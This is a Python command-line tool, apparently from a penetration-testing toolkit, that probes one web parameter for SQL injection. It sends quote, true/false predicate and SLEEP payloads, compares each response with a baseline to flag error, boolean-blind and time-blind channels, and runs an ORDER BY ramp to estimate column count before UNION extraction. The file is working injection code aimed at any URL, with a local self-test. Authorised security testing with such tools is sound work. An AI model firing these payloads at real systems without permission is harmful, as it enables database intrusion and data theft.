#!/usr/bin/env python3
"""sqli_probe.py — SQLi channel matrix for one parameter. Stdlib only (httpkit).

The web-sqli skill's confirm step is a fixed matrix — baseline, quote, true
predicate, false predicate, sleep — but firing it by hand means inferring a
differential from memory. This fires the matrix, measures each response
against the baseline (status, length, body signature, elapsed), and reports
which *channels* showed signal: error, boolean-blind, time-blind. Every
verdict is a channel CANDIDATE with the verbatim excerpt attached — a
signature difference is a measurement to investigate, never a finding by
itself; the class's own confirming probe still has to run.

    python3 tools/web/sqli_probe.py --url 'http://h/item?id=1' --param id
    python3 tools/web/sqli_probe.py --url URL --body 'id={M}' --method POST
    python3 tools/web/sqli_probe.py --url URL --param id --order-by 12
    python3 tools/web/sqli_probe.py --selftest
"""
from __future__ import annotations

import argparse
import re
import sys
import time
import urllib.parse

import httpkit

_DB_ERRORS = re.compile(
    r"(?:sql syntax|mysql|mariadb|ORA-\d+|PSQL|postgres|sqlite3?|unclosed quotation|"
    r"unterminated string|ODBC|JDBC|pg_query|mysqli?_|syntax error.{0,30}sql|"
    r"near \".{0,30}\": syntax|You have an error in your SQL)", re.I)

_SLEEP_S = 2.0          # timing oracle asks for this many seconds
_TIME_MIN = 1.5         # observed elapsed must exceed this to count as signal


def _fire(args, value):
    url, body = args["url"], args.get("body")
    if args.get("param"):
        if args.get("method", "GET") == "GET":
            q = urllib.parse.urlparse(url)
            pairs = urllib.parse.parse_qsl(q.query, keep_blank_values=True)
            pairs = [(k, value if k == args["param"] else v) for k, v in pairs]
            if args["param"] not in [k for k, _ in pairs]:
                pairs.append((args["param"], value))
            url = urllib.parse.urlunparse(q._replace(query=urllib.parse.urlencode(pairs)))
        else:
            enc = urllib.parse.urlencode({args["param"]: value})
            body = enc if not body else body + "&" + enc
    elif body:
        body = body.replace("{M}", urllib.parse.quote_plus(value))
    else:
        url = url.replace("{M}", urllib.parse.quote(value))
    t0 = time.time()
    r = httpkit.request(url, method=args.get("method", "GET"),
                        headers=args.get("headers"), body=body,
                        timeout=args.get("timeout", 15))
    r["_elapsed"] = round(time.time() - t0, 3)
    return r


def _sig(r):
    body = r.get("body", "")
    if isinstance(body, bytes):
        body = body.decode("utf-8", "replace")
    return {"status": r.get("status"), "len": len(body),
            "sig": httpkit.body_signature(body) if body else None,
            "elapsed": r.get("_elapsed"), "error": r.get("error")}


def detect(args) -> dict:
    base_val = args.get("value", "1")
    base = _fire(args, base_val)
    b = _sig(base)
    out = {"url": args["url"], "param": args.get("param"), "baseline": b, "cases": []}

    cases = [
        ("quote", base_val + "'"),
        ("true",  base_val + "' AND 1=1-- -"),
        ("false", base_val + "' AND 1=2-- -"),
        ("sleep", base_val + f"' AND SLEEP({int(_SLEEP_S)})-- -"),
    ]
    res = {}
    for name, payload in cases:
        r = _fire(args, payload)
        s = _sig(r)
        body = r.get("body", "")
        if isinstance(body, bytes):
            body = body.decode("utf-8", "replace")
        m = _DB_ERRORS.search(body)
        res[name] = {**s, "db_error": bool(m),
                     "excerpt": body[max(0, m.start() - 40):m.end() + 40] if m else None}
        out["cases"].append({"case": name, "payload": payload, **res[name]})

    chan = []
    if res["quote"]["db_error"] and not _DB_ERRORS.search(base.get("body") or ""):
        chan.append({"channel": "error", "signal": "db error text on quote only",
                     "excerpt": res["quote"]["excerpt"]})
    same_true = res["true"]["sig"] == b["sig"] or res["true"]["len"] == b["len"]
    diff_false = res["false"]["sig"] != res["true"]["sig"] or \
                 abs(res["false"]["len"] - res["true"]["len"]) > 4
    if same_true and diff_false:
        chan.append({"channel": "boolean-blind",
                     "signal": f"true≈baseline (len {res['true']['len']} vs {b['len']}), "
                               f"false differs (len {res['false']['len']})"})
    if res["sleep"]["elapsed"] >= _TIME_MIN and b["elapsed"] < _TIME_MIN:
        chan.append({"channel": "time-blind",
                     "signal": f"sleep case took {res['sleep']['elapsed']}s vs baseline {b['elapsed']}s"})
    out["channels"] = chan
    out["candidate_only"] = True
    if not chan:
        out["note"] = "no channel showed signal on this matrix — record as inconclusive, not clean"
    return out


def order_by(args) -> dict:
    """Binary ramp ' ORDER BY n-- - until the response changes → column count."""
    lo, hi, probes = 1, args["order_by"], []
    while lo < hi:
        mid = (lo + hi + 1) // 2
        s = _sig(_fire(args, args.get("value", "1") + f"' ORDER BY {mid}-- -"))
        probes.append({"n": mid, "status": s["status"], "len": s["len"]})
        ok = s["status"] and s["status"] < 500 and not s.get("db_error")
        if ok:
            lo = mid
        else:
            hi = mid - 1
    return {"columns_estimate": lo, "probes": probes,
            "note": "estimate only — confirm with ' UNION SELECT NULL,...-- - before extracting"}


def _selftest() -> int:
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    class Db(BaseHTTPRequestHandler):
        def do_GET(self):
            q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            v = q.get("id", ["1"])[0]
            body, code = b"item A", 200
            if "ORDER BY" in v:
                n = int(re.search(r"ORDER BY (\d+)", v).group(1))
                body, code = (b"item A", 200) if n <= 3 else (b"col err", 500)
            elif v.endswith("'") and "AND" not in v:
                body, code = b'You have an error in your SQL syntax near "\'"', 500
            elif "AND 1=2" in v:
                body = b""
            elif "SLEEP" in v:
                time.sleep(_SLEEP_S)
            self.send_response(code)
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *_a):
            pass

    srv = ThreadingHTTPServer(("127.0.0.1", 0), Db)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    url = f"http://127.0.0.1:{srv.server_address[1]}/?id=1"
    out = detect({"url": url, "param": "id", "method": "GET", "timeout": 15})
    chans = {c["channel"] for c in out["channels"]}
    assert "error" in chans and "boolean-blind" in chans and "time-blind" in chans, out
    ob = order_by({"url": url, "param": "id", "method": "GET", "timeout": 15, "order_by": 8})
    assert ob["columns_estimate"] == 3, ob
    srv.shutdown()
    print("sqli_probe selftest: ok")
    return 0


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0],
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url")
    ap.add_argument("--param", help="parameter to inject")
    ap.add_argument("--value", default="1", help="known-good baseline value")
    ap.add_argument("--method", default="GET", choices=["GET", "POST"])
    ap.add_argument("--body", help="POST body; {M} marks the injection slot")
    ap.add_argument("--headers", nargs="*")
    ap.add_argument("--timeout", type=float, default=15)
    ap.add_argument("--order-by", type=int, metavar="MAX",
                    help="column-count ramp instead of the detection matrix")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)
    if args.selftest:
        return _selftest()
    if not args.url or not (args.param or args.body or "{M}" in args.url):
        ap.print_help()
        return 2
    a = vars(args) | {"headers": httpkit.parse_headers(args.headers)}
    out = order_by(a) if args.order_by else detect(a)
    httpkit.jprint(out)
    return 0


if __name__ == "__main__":
    sys.exit(main())
